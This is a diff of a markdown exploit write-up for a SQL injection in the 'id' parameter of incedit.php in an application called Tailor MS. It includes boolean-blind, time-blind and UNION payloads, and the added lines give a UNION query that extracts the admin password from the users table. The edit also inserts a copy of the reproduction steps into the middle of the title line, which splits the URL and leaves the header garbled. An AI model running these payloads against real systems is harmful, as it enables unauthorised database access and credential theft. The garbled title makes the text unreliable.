@@ -1,4 +1,12 @@
-# Exploit Title: Tailor MS – SQL Injection in incedit.php (`http://localhost/tailor/incedit.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in incedit.php (`http## Steps to Reproduce
+
+1. Browse to `http://localhost:8000/incedit.php?id=1`.  
+2. Intercept the request and inject the following payload into the `id` parameter:
+    ```
+    http://localhost:8000/incedit.php?id=-1' union select 1,2,3,password from users where username='admin'-- -
+    ```
+3. Observe the extracted admin password displayed in the application (see screenshot above).
+4. Confirm DBMS fingerprinting and data extraction as permitted by the app's DB privileges.alhost:8000/incedit.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +28,31 @@ A SQL Injection vulnerability exists in the `incedit.php` endpoint of **Tailor M
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/incedit.php?id=1`
+- **URL:** `http://localhost:8000/incedit.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `incedit.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
   - **Payload:** `id=1' AND 4209=(SELECT (CASE WHEN (4209=4209) THEN 4209 ELSE (SELECT 9585 UNION SELECT 2864) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
   - **Payload:** `id=1' AND (SELECT 2926 FROM (SELECT(SLEEP(5)))xnFb)-- ADuE`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 4 columns
-  - **Payload:** 
-```
-id=1' UNION ALL SELECT NULL,NULL,CONCAT(0x7170787871,0x736544646b68726d7a5a6645625a614f66626f6146644b514f5565536146757961734a6259746f47,0x717a706271),NULL-- -
-```
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract admin password - 4 columns
+  - **Payload:**  
+    ```
+    http://localhost:8000/incedit.php?id=-1' union select 1,2,3,password from users where username='admin'-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +72,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/incedit.php?id=1`.  
+1. Browse to `http://localhost:8000/incedit.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `incedit.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +82,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
